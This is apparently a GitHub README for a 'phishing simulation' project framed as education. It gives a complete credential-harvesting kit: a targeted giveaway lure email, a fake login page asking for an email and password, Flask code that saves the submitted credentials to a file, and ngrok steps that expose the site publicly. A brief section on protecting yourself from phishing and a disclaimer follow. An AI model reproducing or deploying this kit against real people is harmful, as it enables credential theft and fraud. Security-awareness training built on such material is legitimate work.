# Phishing Website Simulation Project

## **Overview** 🐟
This project showcases a creative and educational approach to simulating phishing websites. It’s designed to help cybersecurity enthusiasts learn the art of phishing in a safe and controlled environment. Think of it as a "phish-tastic" journey where we explore how phishing works while keeping everything ethical and fun. This project is strictly for educational purposes, folks! 🎓

---

## **📚 Table of Contents**
- [Overview 🐟](#overview)
- [Tools and Technologies Used 🛠️](#tools-and-technologies-used-)
- [Project Steps ⚙️](#project-steps-)
  - [Setting Up the Environment ⚙️](#step-1-setting-up-the-environment-️)
  - [Designing the Phishing Email ✉️](#step-2-designing-the-phishing-email-️)
  - [Building the Phishing Website 🌐](#step-3-building-the-phishing-website-)
  - [Testing with Ngrok 🚀](#step-4-testing-with-ngrok-)
  - [How to Run the Project 🖥️](#how-to-run-the-project-)
- [Screenshots 📸](#screenshots-)
- [How to Protect Yourself from Phishing 🛡️](#how-to-protect-yourself-from-phishing-️)
- [Outcome 🎯](#outcome-)
- [Disclaimer ⚠️](#disclaimer-️)

---

## **Tools and Technologies Used** 🛠️

### **1. Tools and Software**:
- **Flask (Python Framework):** The backbone for building and running the phishing website backend.
- **Ngrok:** Allows exposing the local Flask app to the internet for testing.
- **Visual Studio Code:** Our go-to editor for crafting the code.

### **2. Websites Referenced:**
- **DoggieLux Website (https://www.doggieluxe.com/):** Inspiration for the giveaway theme and email design.

### **3. File Hosting:**
- **Local Environment:** Static files like HTML, CSS, and images were hosted locally using Flask.

---

## **Project Steps** ⚙️

### **Step 1: Setting Up the Environment** ⚙️
1. Install Python dependencies:
   ```bash
   pip install flask
   ```
2. Create a virtual environment:
   ```bash
   python3 -m venv myenv
   source myenv/bin/activate
   ```

---

### **Step 2: Designing the Phishing Email** ✉️

#### **Email Content:**
We designed a convincing email targeting Bob, a bull terrier enthusiast, to lure him into clicking the link. Below is the email content:

```markdown
Subject: 🐾 Don’t Miss Out, Bob! Bull Terrier Giveaway Ends Soon! 🐾

Body:
Hi Bob,

We know how much you adore bull terriers—so we’ve teamed up with [DoggieLux](https://www.doggieluxe.com/) to bring you something special!

🎉 **Exclusive Giveaway for Bull Terrier Lovers** 🎉

Enter now for a chance to win one of these amazing prizes:
- 🦴 **Premium Bull Terrier Care Package**
- 🐕 **Custom Merchandise Featuring Your Dog's Name**
- 🛍️ **A $100 Gift Card for Pet Supplies**

**[Click Here to Enter the Giveaway Now!](https://3fd6-91-178-64-150.ngrok-free.app)**

🕓 **Hurry—Entries Close in 48 Hours!**

Warm regards,  
The Bull Terrier Community Team  
🐾 We ❤️ Bull Terriers!
```

---

### **Step 3: Building the Phishing Website** 🌐

> **Note:** When testing, do not use your real email or password! This is a simulation, so make up fake credentials for safety and fun. 😉

#### **1. Flask Application (Backend):**
The Flask app handles the backend logic for serving pages and storing form submissions.

**app.py:**
```python
from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def home():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form.get('username')
    password = request.form.get('password')
    with open('credentials.txt', 'a') as file:
        file.write(f'Username: {username}, Password: {password}\n')
    return render_template('thank_you.html')

if __name__ == '__main__':
    app.run(debug=True)
```

---

#### **2. HTML and CSS (Frontend):**
The frontend is styled to appear professional and convincing.

**index.html:**
```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Bull Terrier Giveaway</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='styles.css') }}">
</head>
<body>
    <div class="container">
        <header>
            <h1>🐾 Bull Terrier Lovers Giveaway 🐾</h1>
        </header>
        <main>
            <img src="{{ url_for('static', filename='dog.jpg') }}" alt="Bull Terrier" class="decorative-image">
            <p>Welcome to the ultimate giveaway for Bull Terrier lovers! Enter your details below for a chance to win:</p>
            <ul>
                <li>A premium Bull Terrier care package 🦴</li>
                <li>Custom Bull Terrier merchandise 🐕</li>
                <li>A $100 gift card for pet supplies 🛍️</li>
            </ul>
            <form action="/submit" method="POST">
                <label for="username">Your Email:</label>
                <input type="text" id="username" name="username" placeholder="Enter your email" required>

                <label for="password">Create a Password:</label>
                <input type="password" id="password" name="password" placeholder="Enter a secure password" required>

                <button type="submit">Join the Giveaway</button>
            </form>
        </main>
        <footer>
            <p>🐶 We ❤️ Bull Terriers! | Powered by DoggieLux</p>
        </footer>
    </div>
</body>
</html>
```

---

### **Step 4: Testing with Ngrok** 🚀
1. Install Ngrok to expose the local Flask app:
   ```bash
   ngrok http 5000
   ```
2. Use the generated Ngrok URL (e.g., `https://3fd6-91-178-64-150.ngrok-free.app`) to access the website externally.

---

### **How to Run the Project** 🖥️

1. **Open a Terminal**  
   Open your terminal on macOS or the appropriate terminal on your operating system.

2. **Start Ngrok**  
   Use the following command to expose your Flask app to the internet:
   ```bash
   ngrok http 5000
   ```
   - This will create a public URL (e.g., `https://abc123.ngrok-free.app`) that you can use to access your website.
   - Leave this terminal window open and running.

3. **Navigate to Your Project Directory**  
   In a **new terminal window**, go to the directory where your project is saved. For example:
   ```bash
   cd /path/to/your/project
   ```

4. **Activate the Python Virtual Environment**  
   Activate your virtual environment by running:
   ```bash
   source myenv/bin/activate
   ```
   If you’re on Windows, use:
   ```cmd
   myenv\Scripts\activate
   ```

5. **Install Required Dependencies** (First-time setup only)  
   If you haven’t already installed the required Python packages, run:
   ```bash
   pip install -r requirements.txt
   ```
   *(If you don’t have a `requirements.txt` file, manually install Flask with `pip install flask`.)*

6. **Run the Flask Application**  
   Start your Flask app with the following command:
   ```bash
   python3 app.py
   ```
   This will host your application locally on `http://127.0.0.1:5000`.

7. **Access Your Website via Ngrok**  
   Copy the public URL generated by **ngrok** (e.g., `https://abc123.ngrok-free.app`) and open it in your browser. This will take you to your phishing simulation website.

8. **Stop the Project**
   - To stop your application:
     1. Press `CTRL+C` in the terminal running `python3 app.py`.
     2. Close the terminal running **ngrok**.

---

## **Screenshots** 📸

### **1. Phishing Email Design:**
[Phishing Email Screenshot]
<img width="925" alt="phishing_email_screenshot" src="https://github.com/user-attachments/assets/1dc7f84d-6a38-47dd-bdf6-47178ffc6667" />
ot.png)

### **2. Landing Page:**
[Landing Page Screenshot]
![landing_page_screenshot](https://github.com/user-attachments/assets/25455409-9bed-4a47-a62f-d20b768cd1d0)


### **3. Success Page:**
[Success Page Screenshot]
![success_page_screenshot](https://github.com/user-attachments/assets/52d8c080-f2e2-4e0a-8cb4-a9a02820be62)


### **4. File Structure:**
[File Structure Screenshot]
![file_structure_screenshot](https://github.com/user-attachments/assets/43f3eb80-85a6-41a6-8bf0-3f5a079ae575)


### **5. Credentials File Where the received credentials are saved**
[Credentials Screenshot]
(https://github.com/user-attachments/assets/669858a9-71aa-4e68-a849-d53b5a08b848)



---

## **How to Protect Yourself from Phishing** 🛡️

### **1. Recognizing Phishing Attempts:**
- **Check the Sender:** Always verify email senders. Suspicious domains like `support@micr0soft.com` are red flags.
- **Hover Before Clicking:** Hover over links to see where they lead. Avoid clicking on unverified URLs.
- **Look for HTTPS:** Ensure the website has a secure connection (padlock icon in the address bar).

### **2. Preventative Measures:**
- **Enable Multi-Factor Authentication (MFA):** Even if your credentials are stolen, MFA adds an extra security layer.
- **Keep Software Updated:** Regular updates prevent vulnerabilities that attackers exploit.
- **Educate Yourself:** Learn about common phishing tactics through training and awareness.

### **3. Responding to Phishing:**
- **Don’t Interact:** Avoid replying or clicking on suspicious emails.
- **Report Phishing Attempts:** Forward phishing emails to your email provider or report to anti-phishing organizations.
- **Change Compromised Passwords:** If you suspect an attack, update passwords immediately.

---

## **Outcome** 🎯
- The phishing website successfully captured form submissions and stored them in `credentials.txt`.
- This project provided hands-on experience in building and testing phishing simulations ethically.

---

## **Disclaimer** ⚠️
This project is strictly for educational purposes. Misuse of these techniques for malicious activities is illegal and unethical. Always ensure proper consent and adhere to cybersecurity laws and guidelines.

---

Enjoy the project! And remember, not every email is as innocent as it seems—stay alert for phishing attempts! 😉🔎
